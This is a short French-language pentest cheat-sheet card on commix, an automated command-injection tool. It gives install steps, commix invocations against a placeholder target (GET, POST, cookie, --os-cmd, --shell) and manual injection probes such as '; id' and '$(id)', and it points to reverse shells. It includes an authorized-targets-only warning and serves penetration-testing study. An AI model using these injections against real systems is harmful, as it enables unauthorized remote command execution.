---
titre: "commix"
tags: [Outils, Web, command-injection, RCE]
source: https://github.com/commixproject/commix
---

# commix

**Détection + exploitation automatisée d'injection de commandes** (*COMMand
Injection eXploiter*). Trouve le point d'injection, gère les cas *blind*
(time-based) et fournit un pseudo-shell. Complète ma fiche [[Command Injection - Index]].

> ⚠️ RCE sur cible autorisée uniquement. Cf. `README`.

## Installation
```bash
sudo apt install commix
# ou : git clone https://github.com/commixproject/commix
```

## Utilisation
```bash
commix -u "http://cible/ping?ip=127.0.0.1"                  # paramètre GET
commix -u "http://cible/ping" --data="ip=127.0.0.1"         # POST
commix -u "http://cible/x?q=1" --cookie="PHPSESSID=..."      # avec session
commix -u "http://cible/x?q=1" --os-cmd="id"                 # commande unique
commix -u "http://cible/x?q=1" --shell                       # pseudo-shell interactif
commix --url="..." --technique=t                             # forcer time-based (blind)
```

## Réflexe
Repérer d'abord manuellement (`; id`, `| id`, `$(id)`, `` `id` ``, `%0aid`) puis
laisser commix confirmer/exploiter. Pour un vrai shell, générer un reverse shell
([[HackTricks & revshells]]).
